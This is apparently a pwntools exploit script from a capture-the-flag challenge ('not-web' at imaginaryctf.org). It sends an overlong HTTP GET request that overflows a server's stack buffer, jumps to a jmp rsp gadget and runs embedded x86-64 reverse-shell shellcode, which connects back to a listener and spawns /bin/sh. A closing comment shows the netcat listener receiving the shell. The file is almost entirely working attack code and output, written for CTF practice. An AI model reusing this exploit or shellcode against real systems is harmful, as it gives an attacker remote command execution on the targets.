from pwn import *

context(os='linux', arch='amd64')
context.log_level = 'debug'

BINARY = './server'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "not-web.chal.imaginaryctf.org"
  PORT = 42042
  s = remote(HOST, PORT)
else:
  HOST = "localhost"
  PORT = 21337
  s = remote(HOST, PORT)
  IPADDR = 0x100007f  # 127.0.0.1

jmp_rsp = 0x40105e # jmp rsp;

PORT = 0x697a       # 31337
shell = asm('''
  /* Init Register */
  xor    rax,rax
  push   rax
  pop    rdi
  push   rax
  pop    rsi
  push   rax
  pop    rdx
  xor    r8,r8
  /* sys_socket */
  push   0x2
  pop    rdi
  push   0x1
  pop    rsi
  push   0x6
  pop    rdx
  push   0x29
  pop    rax
  syscall
  /* sys_connect */
  mov    r8,rax
  xor    rsi,rsi
  xor    r10,r10
  push   r10
  mov    BYTE PTR [rsp],0x2
  mov    WORD PTR [rsp+0x2],''' + str(PORT) + '''
  mov    DWORD PTR [rsp+0x4],''' + str(IPADDR) + '''
  mov    rsi,rsp
  push   0x10
  pop    rdx
  push   r8
  pop    rdi
  push   0x2a
  pop    rax
  syscall
  /* sys_dup2 */
  xor    rsi,rsi
  push   0x3
  pop    rsi
loop0:
  dec    rsi
  push   0x21
  pop    rax
  syscall 
  jne    loop0
  /* sys_execve */
  xor    rdi,rdi
  push   rdi
  push   rdi
  pop    rsi
  pop    rdx
  movabs rdi,0x68732f6e69622f2f
  shr    rdi,0x8
  push   rdi
  push   rsp
  pop    rdi
  push   0x3b
  pop    rax
  syscall
  ''')

buf  = "GET /"
buf += "A"*0xa0
buf += "\x00"*8
buf += "B"*0x40
buf += p64(jmp_rsp)
buf += shell
buf += " HTTP/1.1\n\n"
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/Desktop$ nc -lvvp 31337
Listening on [0.0.0.0] (family 0, port 31337)
Connection from localhost 60696 received!
id
uid=1000(mito) gid=1000(mito) groups=1000(mito),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),118(lpadmin),128(sambashare)
'''
